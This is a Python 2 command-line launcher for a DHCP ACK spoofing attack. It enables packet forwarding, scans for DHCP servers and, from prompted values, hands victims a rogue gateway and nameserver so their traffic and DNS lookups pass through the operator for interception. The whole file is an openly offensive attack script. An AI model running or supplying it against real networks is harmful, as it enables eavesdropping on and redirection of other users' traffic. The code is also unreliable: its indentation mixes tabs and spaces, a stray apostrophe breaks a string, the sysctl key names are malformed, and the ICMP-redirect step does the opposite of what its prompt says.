#!/usr/bin/python2

__author__ = 'redwind'

from dhcp_ack_spoofing import *
import os
from subprocess import PIPE, Popen


print('DHCP_ack_spoofing module.')

if os.getuid() != 0:
    print('This tools need to be runned as root!')
    exit()

p = Popen(['sysctl', 'net.ipv4.ip_forward'], stdout=PIPE, stderr=PIPE)
(out,err) = p.communicate()
if int(out.split(' ')[2]) != 1:
    print('Packet forwarding is not enabled!')
    activate_forwarding = raw_input('Activate it? (y/n) :')
    if activate_forwarding == 'y':
        p1 = Popen(['sysctl', 'net.ipv4.ip_forward=1'], stdout=PIPE, stderr=PIPE)
        p1.communicate()


interface = raw_input('Network interface to listen/spoof :').strip()

p = Popen(['sysctl', 'net.ipv4.conf.' + interface + 'send_redirects'], stdout=PIPE, stderr=PIPE)
(out,err) = p.communicate()
if int(out.split(' ')[2]) != 1:
    print('By default, this interface will send ICMP redirect to the real gateway.')
	print('That means you won't be able to intercept packets!')
	print('If you are only targetting the DNS hack, however, this should not cause problem.')

    activate_forwarding = raw_input('Deactivate ICMP redirect? (y/n) :')
    if activate_forwarding == 'y':
        p1 = Popen(['sysctl', 'net.ipv4.conf.'+interface+'send_redirects=1'], stdout=PIPE, stderr=PIPE)
        p1.communicate()

attack = DHCPAckSpoofing(interface=interface)

do_scan = raw_input('Do you want to scan for DHCP servers \n'
                'before listening for incoming requests? (y/n) :')

if do_scan == 'y':
    timeout = input('Timeout value in sec (5 is good) :')
    print('Scanning...')
    attack.scan_dhcp_servers(timeout=timeout)
    attack.print_found_dhcp()

print('\nSetup attack parameters ... ')
domain = DomainConfig(
    gateway=raw_input('gateway :'),
    broadcast=raw_input('broadcast : '),
    netmask=raw_input('netmask :'),
    domain_name=raw_input('domain name :'),
    nameserver=raw_input('nameserver :')
    )

print('\nLaunching the attack!!')
print('Waiting for clients to send DHCP request...')

attack.launch_attack(domain_config=domain)
